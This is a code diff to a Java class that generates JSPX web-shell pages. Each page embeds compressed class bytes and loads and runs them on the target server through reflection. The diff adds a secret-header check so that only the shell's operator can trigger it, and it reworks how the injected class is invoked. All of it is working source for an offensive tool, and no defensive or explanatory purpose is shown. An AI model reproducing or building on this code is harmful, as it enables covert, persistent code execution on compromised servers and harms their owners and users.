@@ -1,5 +1,7 @@
 package org.leo.jmg.jsp.http;
 
+import org.leo.jmg.jsp.WebShellRequestGuard;
+
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
@@ -7,6 +9,11 @@ import java.util.zip.GZIPOutputStream;
 
 public class JspxServer {
     public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {
+        return wrap(coreClassName, coreClass, respCode, null, null);
+    }
+
+    public String wrap(String coreClassName, byte[] coreClass, int respCode,
+                       String headerName, String headerValue) throws IOException {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
         gzipOutputStream.write(coreClass);
@@ -19,6 +26,7 @@ public class JspxServer {
         sb.append("<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">\n")
                 .append("    <jsp:directive.page import=\"java.io.InputStream,java.lang.reflect.Method,java.math.BigInteger,java.io.ByteArrayOutputStream,java.util.zip.GZIPInputStream,java.io.ByteArrayInputStream\"/>\n")
                 .append("    <jsp:scriptlet>\n")
+                .append(WebShellRequestGuard.sourceForJspx(headerName, headerValue, "        "))
                 .append("        response.setStatus(").append(respCode).append(");\n")
                 .append("        out.clear();\n")
                 .append("        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n")
@@ -44,7 +52,7 @@ public class JspxServer {
                 .append("            while ((bytesRead = inputStream.read(buffer)) != -1) {\n")
                 .append("                byteArrayOutputStream.write(buffer, 0, bytesRead);\n")
                 .append("            }\n")
-                .append("            Class.forName(\"").append(coreClassName).append("\").newInstance().equals(byteArrayOutputStream);\n")
+                .append("            ((java.lang.reflect.InvocationHandler)Class.forName(\"").append(coreClassName).append("\").newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});\n")
                 .append("            response.getOutputStream().write(byteArrayOutputStream.toByteArray());\n")
                 .append("        }\n")
                 .append("    </jsp:scriptlet>\n")
